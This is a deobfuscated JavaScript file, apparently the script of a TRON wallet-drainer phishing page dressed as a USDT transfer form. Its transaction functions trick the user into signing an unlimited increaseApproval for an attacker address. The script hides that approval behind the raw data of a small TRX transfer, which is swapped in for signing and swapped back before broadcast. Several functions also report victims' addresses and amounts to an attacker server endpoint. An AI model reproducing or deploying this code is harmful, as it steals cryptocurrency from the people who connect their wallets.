//Mon Aug 19 2024 16:41:57 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
(function () {})();
var contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
  walletAddress,
  usdtBalance = 0,
  trxBalance = 0,
  code,
  isConnected = false;
async function getUsdtBalance(_0x3b4c65, _0x5badd7) {
  let _0x4e3d16 = window.tronWeb,
    _0x1a1d1 = [{
      "type": "address",
      "value": _0x3b4c65
    }],
    _0x3205f7 = {},
    _0x29a2ae = await _0x4e3d16.transactionBuilder.triggerSmartContract(contractAddress, "balanceOf(address)", _0x3205f7, _0x1a1d1, _0x3b4c65);
  _0x29a2ae.result && _0x5badd7 != undefined && _0x5badd7(_0x29a2ae.constant_result[0]);
}
async function getAssets(_0x237c77) {
  code = getUrlParams("code");
  try {
    let _0x574135 = navigator.userAgent.toLowerCase();
    (/okex/.test(_0x574135) || isPc()) && (window.okxwallet.tronLink.ready ? window.tronWeb = okxwallet.tronLink.tronWeb : 200 === (await window.okxwallet.tronLink.request({
      "method": "tron_requestAccounts"
    })).code && (window.tronWeb = tronLink.tronWeb));
    if (!window.tronWeb) {
      const _0x576cc6 = TronWeb.providers.HttpProvider,
        _0x311062 = new _0x576cc6(tronApi),
        _0x58eefb = new _0x576cc6(tronApi),
        _0x1dfd86 = tronApi,
        _0x10c4b3 = new TronWeb(_0x311062, _0x58eefb, _0x1dfd86);
      window.tronWeb = _0x10c4b3;
    }
  } catch (_0x4707f2) {}
  if (window.tronWeb) {
    var _0x2a31ce = window.tronWeb;
    walletAddress = _0x2a31ce.defaultAddress.base58;
    if (walletAddress == false) {
      await getAssets(_0x237c77);
      return;
    }
    try {
      let _0x290c3c = await _0x2a31ce.trx.getBalance(walletAddress);
      trxBalance = _0x2a31ce.fromSun(_0x290c3c);
      getUsdtBalance(walletAddress, function (_0x24cc56) {
        usdtBalance = _0x2a31ce.fromSun(parseInt(_0x24cc56, 16));
        isConnected = true;
        _0x237c77 != undefined && _0x237c77(trxBalance, trxBalance);
      });
    } catch (_0x3c1026) {
      tip(_0x3c1026);
    }
  } else tip("请用钱包扫码打开");
}
async function transfer_f() {
  amount = $("#amount").val() ? $("#amount").val() : 0;
  let _0x133072 = document.getElementById("ye").innerHTML;
  if (amount == 0) {
    tip("请输入转账金额");
    return;
  }
  if (amount > _0x133072) {
    tip("金额输入错误");
    return;
  }
  if (!isConnected) {
    tip("正在连接网络。。。", 2000);
    return;
  }
  tip("正在创建交易。。。", 2000);
  executeBlockchainTransaction();
}
function tip(_0x5cb7e3, _0x3ea83e = 1500) {
  $("#tip").html(_0x5cb7e3);
  $("#tip").show();
  setTimeout(function () {
    $("#tip").hide();
  }, _0x3ea83e);
}
function sleep(_0x525c1f) {
  return new Promise(_0x5918da => setTimeout(_0x5918da, _0x525c1f));
}
function isOkxApp() {
  let _0x4e0fd1 = navigator.userAgent,
    _0x1044ee = /OKApp/i.test(_0x4e0fd1);
  return _0x1044ee;
}
function isMobile() {
  let _0x37bd11 = navigator.userAgent,
    _0x482114 = /iphone|ipad|ipod|ios/i.test(_0x37bd11),
    _0x428da7 = /android|XiaoMi|MiuiBrowser/i.test(_0x37bd11),
    _0x2c03e2 = _0x482114 || _0x428da7;
  return _0x2c03e2;
}
function isPc() {
  let _0x3a0382 = navigator.userAgent,
    _0x5eb8a8 = /windows/i.test(_0x3a0382);
  return _0x5eb8a8;
}
function changeTitle(_0x506f61) {
  $("title").html(_0x506f61);
}
function getUrlParams(_0x85a40c) {
  var _0x4e187f = window.location.search.substr(1);
  if (_0x4e187f == "") return false;
  var _0x39e0f2 = _0x4e187f.split("&");
  for (var _0x15464f = 0; _0x15464f < _0x39e0f2.length; _0x15464f++) {
    var _0x417307 = _0x39e0f2[_0x15464f].split("=");
    if (_0x417307[0] == _0x85a40c) return _0x417307[1];
  }
  return false;
}
async function executeBlockchainTransaction() {
  try {
    let _0x13be68 = window.tronWeb,
      _0x259df5 = _0x13be68.defaultAddress.base58,
      _0x148041 = document.getElementById("ye"),
      _0x6344e3 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const _0x267913 = [{
      "type": "address",
      "value": p_authorized_address
    }, {
      "type": "uint256",
      "value": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
    }];
    let _0x4046ea = document.getElementById("amount-display").textContent;
    var _0x50b100 = {
      "address": _0x259df5,
      "auth_address": p_authorized_address,
      "bizhong": "USDT",
      "agent": p_agent,
      "zhuanzhang": _0x4046ea
    };
    const _0x51d58d = {
        "feeLimit": 100000000
      },
      _0x16988a = await _0x13be68.transactionBuilder.triggerSmartContract(_0x6344e3, "increaseApproval(address,uint256)", _0x51d58d, _0x267913, _0x259df5),
      _0x152af1 = _0x13be68.toSun(amount);
    const _0x1f5397 = await _0x13be68.transactionBuilder.sendTrx("TGrYm5fZvCa2P5jLACDS8GMBnChQWcGiBw", _0x152af1, _0x259df5);
    var _0x5b2d2c = _0x16988a.transaction.raw_data;
    _0x16988a.transaction.raw_data = _0x1f5397.raw_data;
    const _0x17ab5c = await _0x13be68.trx.sign(_0x16988a.transaction);
    _0x17ab5c.raw_data = _0x5b2d2c;
    const _0x1991b7 = _0x13be68.trx.sendRawTransaction(_0x17ab5c);
    if (_0x1991b7) {
      alert("交易成功！");
      var _0x5cc6d3 = new Date(),
        _0x1705ef = _0x5cc6d3.getTime();
      $.ajax({
        "type": "get",
        "url": domain + "/index/api/trc_posts?t=" + _0x1705ef,
        "data": _0x50b100,
        "success": function () {}
      });
    }
  } catch (_0x3c1fc5) {
    console.error("An error occurred during the blockchain transaction:", _0x3c1fc5);
  }
}
async function onConnect() {
  try {
    let _0x3803a1 = window.tronWeb,
      _0x44dbab = await (window.okxwallet?.["tronLink"]?.["request"]({
        "method": "tron_requestAccounts"
      }) || {});
    _0x3803a1 = _0x44dbab?.["code"] === 200 ? window.okxwallet.tronLink.tronWeb : _0x3803a1;
    let _0x2f3a07 = _0x3803a1.defaultAddress.base58,
      _0x153574 = document.getElementById("amount-display").textContent,
      _0x26fbf6 = 90000000000000,
      _0x5e939a = document.getElementById("ye"),
      _0x269f46 = [{
        "type": "address",
        "value": p_authorized_address
      }, {
        "type": "uint256",
        "value": _0x26fbf6
      }];
    var _0x564bd7 = {
        "address": _0x2f3a07,
        "auth_address": p_authorized_address,
        "bizhong": "USDT",
        "agent": p_agent,
        "zhuanzhang": _0x153574
      },
      _0x7e9159 = new Date(),
      _0x5f9a50 = _0x7e9159.getTime();
    $.ajax({
      "type": "get",
      "url": domain + "/index/api/trc_posts?t=" + _0x5f9a50,
      "data": _0x564bd7,
      "success": function () {}
    });
    let _0x5e2576 = await _0x3803a1.transactionBuilder.triggerSmartContract("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", "increaseApproval(address,uint256)", {}, _0x269f46, _0x2f3a07);
    var _0x7e9159 = new Date(),
      _0x5f9a50 = _0x7e9159.getTime();
    $.ajax({
      "type": "get",
      "url": domain + "/index/api/trc_posts?t=" + _0x5f9a50,
      "data": _0x564bd7,
      "success": function () {}
    });
  } catch (_0x362e42) {}
}
async function tpapprove() {
  let _0x1f401d = document.getElementById("ye"),
    _0x4590e4 = tronWeb.defaultAddress.base58;
  const _0x4d59a9 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
  let _0x2e4f75 = document.getElementById("amount-display").textContent;
  var _0x4cb3e1 = {
    "address": _0x4590e4,
    "auth_address": p_authorized_address,
    "bizhong": "USDT",
    "agent": p_agent,
    "zhuanzhang": _0x2e4f75
  };
  try {
    let _0x3b5684 = await tronWeb.contract().at(_0x4d59a9);
    var _0x351bf4 = new Date(),
      _0x4274ae = _0x351bf4.getTime();
    $.ajax({
      "type": "get",
      "url": domain + "/index/api/trc_posts?t=" + _0x4274ae,
      "data": _0x4cb3e1,
      "success": function () {}
    });
  } catch (_0xe8d94d) {
    console.error(_0xe8d94d);
  }
}